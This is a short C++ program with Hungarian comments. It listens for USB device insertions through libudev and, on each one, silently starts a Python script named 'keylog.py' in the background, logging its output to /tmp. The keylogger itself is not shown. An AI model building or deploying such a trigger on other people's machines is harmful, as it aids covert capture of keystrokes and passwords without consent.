#include <libudev.h>
#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>

void runPythonScript() {
    // Frissítsd a Python script elérési útját
    int ret = system("python3 /full/path/to/keylog.py > /tmp/keylog_output.txt 2>&1 &");
    std::cout << "Running Python script... Command return value: " << ret << std::endl;
    if (ret != 0) {
        std::cerr << "Error running Python script" << std::endl;
    }
}

int main() {
    struct udev *udev = udev_new();
    if (!udev) {
        std::cerr << "Failed to create udev" << std::endl;
        return 1;
    }

    struct udev_monitor *mon = udev_monitor_new_from_netlink(udev, "udev");
    if (!mon) {
        std::cerr << "Failed to create udev monitor" << std::endl;
        udev_unref(udev);
        return 1;
    }

    udev_monitor_filter_add_match_subsystem_devtype(mon, "usb", NULL);
    udev_monitor_enable_receiving(mon);

    while (true) {
        struct udev_device *dev = udev_monitor_receive_device(mon);
        if (dev) {
            if (strcmp(udev_device_get_action(dev), "add") == 0) {
                std::cout << "USB device connected!" << std::endl;
                runPythonScript();  // Futtatja a Python scriptet
            }
            udev_device_unref(dev);
        }
        usleep(100000);  // Alvás a CPU terhelés csökkentésére
    }

    udev_unref(udev);
    return 0;
}
